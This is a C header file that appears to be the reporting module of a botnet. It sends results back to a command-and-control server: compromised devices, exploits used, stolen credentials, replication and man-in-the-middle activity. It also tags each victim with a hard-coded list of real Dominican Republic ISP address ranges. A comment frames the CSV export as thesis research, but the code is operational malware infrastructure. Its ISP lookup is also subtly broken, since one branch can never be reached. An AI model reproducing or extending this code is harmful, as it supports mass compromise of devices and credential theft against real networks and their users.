#ifndef REPORT_SYSTEM_H
#define REPORT_SYSTEM_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <json-c/json.h>

// Report types
typedef enum {
    REPORT_DEVICE_FOUND,
    REPORT_EXPLOITATION_SUCCESS,
    REPORT_EXPLOITATION_FAILED,
    REPORT_SCAN_COMPLETE,
    REPORT_REPLICATION,
    REPORT_MITM_STARTED,
    REPORT_CREDENTIALS_FOUND,
    REPORT_VULNERABILITY_DETECTED,
    REPORT_NETWORK_MAP
} ReportType;

// Geolocation data
typedef struct {
    char country[64];
    char city[64];
    char province[64];
    char isp[128];
    float latitude;
    float longitude;
} GeoLocation;

// Statistics for analysis
typedef struct {
    int total_devices_scanned;
    int devices_vulnerable;
    int devices_compromised;
    int exploits_attempted;
    int exploits_successful;
    int credentials_tested;
    int ports_scanned;
    time_t scan_start_time;
    time_t scan_end_time;
} ScanStatistics;

// Detailed report structure
typedef struct {
    time_t timestamp;
    ReportType type;
    char bot_id[64];
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    char device_type[64];
    char vendor[64];
    char model[128];
    char firmware[64];
    char exploit_used[128];
    char cve[32];
    char credentials_used[128];
    int success;
    GeoLocation geolocation;
    char additional_data[512];
} DetailedReport;

// ISP ranges in República Dominicana
typedef struct {
    char isp_name[64];
    char ip_range[32];
} DominicanISP;

static DominicanISP dominican_isps[] = {
    {"Claro Dominicana", "200.88.0.0/16"},
    {"Claro Dominicana", "200.0.32.0/19"},
    {"Altice Dominicana", "190.166.0.0/16"},
    {"Altice Dominicana", "181.36.0.0/16"},
    {"Viva (Trilogy)", "201.229.0.0/16"},
    {"Viva (Trilogy)", "200.42.128.0/17"},
    {"Wind Telecom", "200.88.128.0/17"},
    {"", ""} // Terminator
};

// ====================================================================================
// GEOLOCATION FUNCTIONS
// ====================================================================================

// Simple IP-to-ISP mapping for Dominican Republic
void identify_dominican_isp(const char *ip, GeoLocation *geo) {
    // Extract first octet and second for matching
    unsigned int oct1, oct2;
    sscanf(ip, "%u.%u", &oct1, &oct2);
    
    // Claro ranges
    if ((oct1 == 200 && oct2 == 88) || 
        (oct1 == 200 && oct2 == 0)) {
        snprintf(geo->isp, sizeof(geo->isp), "Claro Dominicana");
        snprintf(geo->country, sizeof(geo->country), "República Dominicana");
    }
    // Altice ranges
    else if ((oct1 == 190 && oct2 == 166) || 
             (oct1 == 181 && oct2 == 36)) {
        snprintf(geo->isp, sizeof(geo->isp), "Altice Dominicana");
        snprintf(geo->country, sizeof(geo->country), "República Dominicana");
    }
    // Viva ranges
    else if ((oct1 == 201 && oct2 == 229) || 
             (oct1 == 200 && oct2 == 42)) {
        snprintf(geo->isp, sizeof(geo->isp), "Viva (Trilogy)");
        snprintf(geo->country, sizeof(geo->country), "República Dominicana");
    }
    // Wind Telecom
    else if (oct1 == 200 && oct2 == 88) {
        snprintf(geo->isp, sizeof(geo->isp), "Wind Telecom");
        snprintf(geo->country, sizeof(geo->country), "República Dominicana");
    }
    // Unknown/International
    else {
        snprintf(geo->isp, sizeof(geo->isp), "Unknown ISP");
        snprintf(geo->country, sizeof(geo->country), "Unknown");
    }
    
    // Set Dominican cities (could be enhanced with more accurate IP mapping)
    snprintf(geo->province, sizeof(geo->province), "Unknown");
    snprintf(geo->city, sizeof(geo->city), "Unknown");
}

// ====================================================================================
// REPORT GENERATION
// ====================================================================================

// Generate JSON report for C2
char* generate_json_report(DetailedReport *report) {
    json_object *jobj = json_object_new_object();
    
    json_object_object_add(jobj, "timestamp", json_object_new_int64(report->timestamp));
    
    // Report type
    const char *type_str = "";
    switch (report->type) {
        case REPORT_DEVICE_FOUND: type_str = "device_found"; break;
        case REPORT_EXPLOITATION_SUCCESS: type_str = "exploitation_success"; break;
        case REPORT_EXPLOITATION_FAILED: type_str = "exploitation_failed"; break;
        case REPORT_SCAN_COMPLETE: type_str = "scan_complete"; break;
        case REPORT_REPLICATION: type_str = "replication"; break;
        case REPORT_MITM_STARTED: type_str = "mitm_started"; break;
        case REPORT_CREDENTIALS_FOUND: type_str = "credentials_found"; break;
        case REPORT_VULNERABILITY_DETECTED: type_str = "vulnerability_detected"; break;
        case REPORT_NETWORK_MAP: type_str = "network_map"; break;
    }
    json_object_object_add(jobj, "report_type", json_object_new_string(type_str));
    
    // Basic info
    json_object_object_add(jobj, "bot_id", json_object_new_string(report->bot_id));
    json_object_object_add(jobj, "target_ip", json_object_new_string(report->target_ip));
    json_object_object_add(jobj, "target_port", json_object_new_int(report->target_port));
    
    // Device info
    if (strlen(report->device_type) > 0)
        json_object_object_add(jobj, "device_type", json_object_new_string(report->device_type));
    if (strlen(report->vendor) > 0)
        json_object_object_add(jobj, "vendor", json_object_new_string(report->vendor));
    if (strlen(report->model) > 0)
        json_object_object_add(jobj, "model", json_object_new_string(report->model));
    if (strlen(report->firmware) > 0)
        json_object_object_add(jobj, "firmware", json_object_new_string(report->firmware));
    
    // Exploit info
    if (strlen(report->exploit_used) > 0)
        json_object_object_add(jobj, "exploit", json_object_new_string(report->exploit_used));
    if (strlen(report->cve) > 0)
        json_object_object_add(jobj, "cve", json_object_new_string(report->cve));
    if (strlen(report->credentials_used) > 0)
        json_object_object_add(jobj, "credentials", json_object_new_string(report->credentials_used));
    
    json_object_object_add(jobj, "success", json_object_new_boolean(report->success));
    
    // Geolocation
    json_object *geo = json_object_new_object();
    json_object_object_add(geo, "country", json_object_new_string(report->geolocation.country));
    json_object_object_add(geo, "province", json_object_new_string(report->geolocation.province));
    json_object_object_add(geo, "city", json_object_new_string(report->geolocation.city));
    json_object_object_add(geo, "isp", json_object_new_string(report->geolocation.isp));
    json_object_object_add(jobj, "geolocation", geo);
    
    // Additional data
    if (strlen(report->additional_data) > 0)
        json_object_object_add(jobj, "details", json_object_new_string(report->additional_data));
    
    // Convert to string
    const char *json_str = json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
    char *result = strdup(json_str);
    json_object_put(jobj);
    
    return result;
}

// Generate statistics report
char* generate_statistics_report(ScanStatistics *stats) {
    json_object *jobj = json_object_new_object();
    
    json_object_object_add(jobj, "total_scanned", json_object_new_int(stats->total_devices_scanned));
    json_object_object_add(jobj, "vulnerable", json_object_new_int(stats->devices_vulnerable));
    json_object_object_add(jobj, "compromised", json_object_new_int(stats->devices_compromised));
    json_object_object_add(jobj, "exploits_attempted", json_object_new_int(stats->exploits_attempted));
    json_object_object_add(jobj, "exploits_successful", json_object_new_int(stats->exploits_successful));
    json_object_object_add(jobj, "credentials_tested", json_object_new_int(stats->credentials_tested));
    
    // Calculate success rate
    float success_rate = 0.0;
    if (stats->exploits_attempted > 0) {
        success_rate = (float)stats->exploits_successful / stats->exploits_attempted * 100.0;
    }
    json_object_object_add(jobj, "success_rate", json_object_new_double(success_rate));
    
    // Time analysis
    time_t duration = stats->scan_end_time - stats->scan_start_time;
    json_object_object_add(jobj, "scan_duration_seconds", json_object_new_int64(duration));
    
    const char *json_str = json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
    char *result = strdup(json_str);
    json_object_put(jobj);
    
    return result;
}

// ====================================================================================
// CSV EXPORT FOR ANALYSIS
// ====================================================================================

// Export report to CSV format for thesis analysis
void export_to_csv(DetailedReport *report, const char *filename) {
    FILE *fp = fopen(filename, "a");
    if (!fp) return;
    
    // Check if file is empty (write header)
    fseek(fp, 0, SEEK_END);
    if (ftell(fp) == 0) {
        fprintf(fp, "Timestamp,BotID,TargetIP,Port,DeviceType,Vendor,Model,Firmware,"
                   "Exploit,CVE,Credentials,Success,Country,Province,City,ISP,Details\n");
    }
    
    // Write data
    char time_str[64];
    struct tm *tm_info = localtime(&report->timestamp);
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm_info);
    
    fprintf(fp, "\"%s\",\"%s\",\"%s\",%d,\"%s\",\"%s\",\"%s\",\"%s\","
               "\"%s\",\"%s\",\"%s\",%d,\"%s\",\"%s\",\"%s\",\"%s\",\"%s\"\n",
        time_str,
        report->bot_id,
        report->target_ip,
        report->target_port,
        report->device_type,
        report->vendor,
        report->model,
        report->firmware,
        report->exploit_used,
        report->cve,
        report->credentials_used,
        report->success,
        report->geolocation.country,
        report->geolocation.province,
        report->geolocation.city,
        report->geolocation.isp,
        report->additional_data
    );
    
    fclose(fp);
}

// ====================================================================================
// HELPER FUNCTIONS
// ====================================================================================

// Create a detailed report
DetailedReport* create_report(const char *bot_id, const char *target_ip, ReportType type) {
    DetailedReport *report = (DetailedReport*)calloc(1, sizeof(DetailedReport));
    if (!report) return NULL;
    
    report->timestamp = time(NULL);
    report->type = type;
    snprintf(report->bot_id, sizeof(report->bot_id), "%s", bot_id);
    snprintf(report->target_ip, sizeof(report->target_ip), "%s", target_ip);
    
    // Identify ISP/geolocation
    identify_dominican_isp(target_ip, &report->geolocation);
    
    return report;
}

// Print report summary to console
void print_report_summary(DetailedReport *report) {
    printf("\n[REPORT] %s\n", report->target_ip);
    printf("  Device: %s %s\n", report->vendor, report->model);
    printf("  Exploit: %s (%s)\n", report->exploit_used, report->cve);
    printf("  Result: %s\n", report->success ? "SUCCESS" : "FAILED");
    printf("  ISP: %s (%s)\n", report->geolocation.isp, report->geolocation.country);
}

#endif // REPORT_SYSTEM_H
